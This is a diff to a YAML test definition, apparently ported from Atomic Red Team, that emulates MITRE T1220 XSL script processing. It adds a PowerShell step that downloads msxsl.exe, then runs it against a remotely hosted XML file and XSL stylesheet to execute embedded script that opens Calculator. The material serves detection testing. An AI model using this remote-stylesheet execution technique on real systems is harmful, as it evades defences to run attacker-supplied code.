@@ -6,15 +6,15 @@ description: |
     (Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
     Open Calculator.exe when test successfully executed, while AV turned off.
 args:
+    - name: xmlfile
+      type: string
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
     - name: xslfile
       type: string
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
     - name: msxsl_exe
       type: path
       default: PathToAtomicsFolder\..\ExternalPayloads\msxsl.exe
-    - name: xmlfile
-      type: string
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
 uuid: a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985
 mitre:
     tactics:
@@ -25,6 +25,12 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        msxsl.exe must exist on disk at specified location ("#{msxsl_exe}")
+      inline: |
+        if (Test-Path "#{msxsl_exe}") {exit 0} else {{Invoke-WebRequest "https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe" -OutFile "#{msxsl_exe}"
+        }}
+      executor: powershell
     - name: msxsl-bypass-using-remote-files
       inline: |
         "{{.Args.msxsl_exe}}" "{{.Args.xmlfile}}" "{{.Args.xslfile}}"
